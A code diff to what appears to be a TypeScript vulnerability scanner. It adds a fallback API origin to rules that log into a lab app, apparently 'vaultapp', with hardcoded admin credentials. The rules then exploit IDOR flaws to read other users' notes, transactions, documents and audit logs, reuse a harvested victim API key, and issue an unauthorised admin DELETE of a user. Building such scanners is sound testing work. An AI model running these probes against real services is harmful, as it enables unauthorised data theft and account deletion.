@@ -88441,7 +88441,9 @@ const vaultappLabGuideRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
-type VaultappAuth = { token: string; userId: number; username: string };
+type VaultappAuth = { token: string; userId: number; username: string; apiOrigin: string };
+
+const VAULTAPP_OMEGA_ORIGIN = "https://vaultapp-omega.vercel.app";
 
 const VAULTAPP_LAB_CREDENTIALS = [
   { username: "rootadmin", password: "adminpass2" },
@@ -88453,9 +88455,19 @@ function vaultappCheckpointBlocked(body: string): boolean {
   return /Vercel Security Checkpoint|verifying your browser/i.test(body);
 }
 
-async function vaultappLogin(ctx: RuleContext): Promise<VaultappAuth | null> {
-  if (!isVaultappHost(ctx)) return null;
-  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+function vaultappLoginOrigins(ctx: RuleContext): string[] {
+  const origins = [ctx.origin];
+  if (/^https:\/\/vaultapp\.vercel\.app\/?$/i.test(ctx.origin.replace(/\/$/, ""))) {
+    origins.push(VAULTAPP_OMEGA_ORIGIN);
+  }
+  return origins;
+}
+
+async function vaultappLoginAtOrigin(
+  ctx: RuleContext,
+  origin: string
+): Promise<VaultappAuth | null> {
+  const loginUrl = new URL("/api/auth/login", origin).toString();
   for (const creds of VAULTAPP_LAB_CREDENTIALS) {
     const maxAttempts = creds.username === "rootadmin" ? 4 : creds.username === "sysadmin" ? 2 : 1;
     for (let attempt = 0; attempt < maxAttempts; attempt++) {
@@ -88480,7 +88492,12 @@ async function vaultappLogin(ctx: RuleContext): Promise<VaultappAuth | null> {
           user?: { id?: number; username?: string };
         };
         if (data.token && data.user?.id && data.user.username) {
-          return { token: data.token, userId: data.user.id, username: data.user.username };
+          return {
+            token: data.token,
+            userId: data.user.id,
+            username: data.user.username,
+            apiOrigin: origin
+          };
         }
       } catch {
         /* try next credential */
@@ -88491,10 +88508,20 @@ async function vaultappLogin(ctx: RuleContext): Promise<VaultappAuth | null> {
   return null;
 }
 
+async function vaultappLogin(ctx: RuleContext): Promise<VaultappAuth | null> {
+  if (!isVaultappHost(ctx)) return null;
+  for (const origin of vaultappLoginOrigins(ctx)) {
+    const auth = await vaultappLoginAtOrigin(ctx, origin);
+    if (auth) return auth;
+  }
+  return null;
+}
+
 async function probeVaultappAdminAuditLogsIdor(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -88504,7 +88531,7 @@ async function probeVaultappAdminAuditLogsIdor(ctx: RuleContext): Promise<RuleRe
   let probeDoc: { status: number; body: string } | null = null;
   for (const candidateId of auditProbeUserIds) {
     if (candidateId === auth.userId) continue;
-    const candidateUrl = new URL("/api/admin/audit-logs", ctx.origin);
+    const candidateUrl = new URL("/api/admin/audit-logs", apiOrigin);
     candidateUrl.searchParams.set("user_id", String(candidateId));
     const candidateDoc = await ctx.probe.get(candidateUrl.toString(), {
       headers,
@@ -88531,7 +88558,7 @@ async function probeVaultappAdminAuditLogsIdor(ctx: RuleContext): Promise<RuleRe
     }
   }
   if (!probeUserId || !probeDoc) return null;
-  const auditUrl = new URL("/api/admin/audit-logs", ctx.origin);
+  const auditUrl = new URL("/api/admin/audit-logs", apiOrigin);
   auditUrl.searchParams.set("user_id", String(probeUserId));
   const doc = probeDoc;
   if (doc.status < 200 || doc.status >= 300) return null;
@@ -88603,7 +88630,8 @@ async function probeVaultappMessagesReadIdor(ctx: RuleContext): Promise<RuleResu
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
-  const readUrl = new URL("/api/messages/read", ctx.origin).toString();
+  const apiOrigin = auth.apiOrigin;
+  const readUrl = new URL("/api/messages/read", apiOrigin).toString();
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     "Content-Type": "application/json",
@@ -88684,6 +88712,7 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const authHeaders = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -88698,7 +88727,7 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
   for (const noteId of noteIdsToTry) {
     if (seenNoteIds.has(noteId)) continue;
     seenNoteIds.add(noteId);
-    const noteUrl = new URL(`/api/notes/${noteId}`, ctx.origin).toString();
+    const noteUrl = new URL(`/api/notes/${noteId}`, apiOrigin).toString();
     const noteDoc = await ctx.probe.get(noteUrl, {
       headers: authHeaders,
       maxBytes: 4096,
@@ -88712,7 +88741,7 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
       const note = JSON.parse(noteDoc.body) as { owner_username?: string; user_id?: number };
       resolvedUsername = note.owner_username ?? null;
       if (!resolvedUsername && note.user_id) {
-        const userUrl = new URL(`/api/users/${note.user_id}`, ctx.origin).toString();
+        const userUrl = new URL(`/api/users/${note.user_id}`, apiOrigin).toString();
         const userDoc = await ctx.probe.get(userUrl, {
           headers: authHeaders,
           maxBytes: 2048,
@@ -88732,7 +88761,7 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
     }
   }
   if (!victimApiKey || !victimUsername) return null;
-  const exportUrl = new URL("/api/account/export", ctx.origin).toString();
+  const exportUrl = new URL("/api/account/export", apiOrigin).toString();
   const exportDoc = await ctx.probe.get(exportUrl, {
     headers: { ...authHeaders, "X-API-Key": victimApiKey },
     maxBytes: 16384,
@@ -88789,6 +88818,7 @@ async function probeVaultappAdminUsersDelete(ctx: RuleContext): Promise<RuleResu
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -88797,7 +88827,7 @@ async function probeVaultappAdminUsersDelete(ctx: RuleContext): Promise<RuleResu
   let victimUsername: string | null = null;
   for (let id = 1; id <= 60; id++) {
     if (id === auth.userId) continue;
-    const userUrl = new URL(`/api/users/${id}`, ctx.origin).toString();
+    const userUrl = new URL(`/api/users/${id}`, apiOrigin).toString();
     const userDoc = await ctx.probe.get(userUrl, { headers, maxBytes: 2048, timeoutMs: 15000 });
     if (userDoc.status < 200 || userDoc.status >= 300) continue;
     try {
@@ -88812,7 +88842,7 @@ async function probeVaultappAdminUsersDelete(ctx: RuleContext): Promise<RuleResu
     }
   }
   if (!victimId || !victimUsername) return null;
-  const deleteUrl = new URL(`/api/admin/users/${victimId}`, ctx.origin).toString();
+  const deleteUrl = new URL(`/api/admin/users/${victimId}`, apiOrigin).toString();
   const delDoc = await ctx.probe.get(deleteUrl, {
     method: "DELETE",
     headers,
@@ -88862,6 +88892,7 @@ async function probeVaultappUsersIdor(ctx: RuleContext): Promise<RuleResult | nu
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -88869,7 +88900,7 @@ async function probeVaultappUsersIdor(ctx: RuleContext): Promise<RuleResult | nu
   const victimIds = [15, 20, 25, 50, 100, auth.userId === 299 ? 10 : 299];
   for (const victimId of victimIds) {
     if (victimId === auth.userId) continue;
-    const userUrl = new URL(`/api/users/${victimId}`, ctx.origin).toString();
+    const userUrl = new URL(`/api/users/${victimId}`, apiOrigin).toString();
     const doc = await ctx.probe.get(userUrl, { headers, maxBytes: 4096, timeoutMs: 15000 });
     if (doc.status < 200 || doc.status >= 300) continue;
     try {
@@ -88928,6 +88959,7 @@ async function probeVaultappTransactionsIdor(ctx: RuleContext): Promise<RuleResu
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -88935,7 +88967,7 @@ async function probeVaultappTransactionsIdor(ctx: RuleContext): Promise<RuleResu
   const victimIds = [15, 20, 25, 50, auth.userId === 299 ? 10 : 299];
   for (const victimId of victimIds) {
     if (victimId === auth.userId) continue;
-    const userUrl = new URL(`/api/users/${victimId}`, ctx.origin).toString();
+    const userUrl = new URL(`/api/users/${victimId}`, apiOrigin).toString();
     const userDoc = await ctx.probe.get(userUrl, { headers, maxBytes: 4096, timeoutMs: 15000 });
     if (userDoc.status < 200 || userDoc.status >= 300) continue;
     let victimAccount: string | null = null;
@@ -88948,7 +88980,7 @@ async function probeVaultappTransactionsIdor(ctx: RuleContext): Promise<RuleResu
       continue;
     }
     if (!victimAccount || !victimUsername || victimUsername === auth.username) continue;
-    const txUrl = new URL("/api/transactions", ctx.origin);
+    const txUrl = new URL("/api/transactions", apiOrigin);
     txUrl.searchParams.set("account_id", victimAccount);
     const txDoc = await ctx.probe.get(txUrl.toString(), {
       headers,
@@ -89013,6 +89045,7 @@ async function probeVaultappNotesIdor(ctx: RuleContext): Promise<RuleResult | nu
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -89025,7 +89058,7 @@ async function probeVaultappNotesIdor(ctx: RuleContext): Promise<RuleResult | nu
   for (const noteId of noteIdsToTry) {
     if (seenNoteIds.has(noteId)) continue;
     seenNoteIds.add(noteId);
-    const noteUrl = new URL(`/api/notes/${noteId}`, ctx.origin).toString();
+    const noteUrl = new URL(`/api/notes/${noteId}`, apiOrigin).toString();
     const doc = await ctx.probe.get(noteUrl, { headers, maxBytes: 4096, timeoutMs: 12000 });
     if (doc.status < 200 || doc.status >= 300) continue;
     try {
@@ -89068,6 +89101,7 @@ async function probeVaultappDocumentsIdor(ctx: RuleContext): Promise<RuleResult 
   if (!isVaultappHost(ctx)) return null;
   const auth = await vaultappLogin(ctx);
   if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
   const headers = {
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
@@ -89081,7 +89115,7 @@ async function probeVaultappDocumentsIdor(ctx: RuleContext): Promise<RuleResult 
     if (seenDocIds.has(docId)) continue;
     seenDocIds.add(docId);
     const encodedId = vaultappDocumentsEncodedId(docId);
-    const docUrl = new URL(`/api/documents/${encodedId}`, ctx.origin).toString();
+    const docUrl = new URL(`/api/documents/${encodedId}`, apiOrigin).toString();
     const doc = await ctx.probe.get(docUrl, { headers, maxBytes: 8192, timeoutMs: 15000 });
     if (vaultappCheckpointBlocked(doc.body)) continue;
     if (doc.status < 200 || doc.status >= 300) continue;
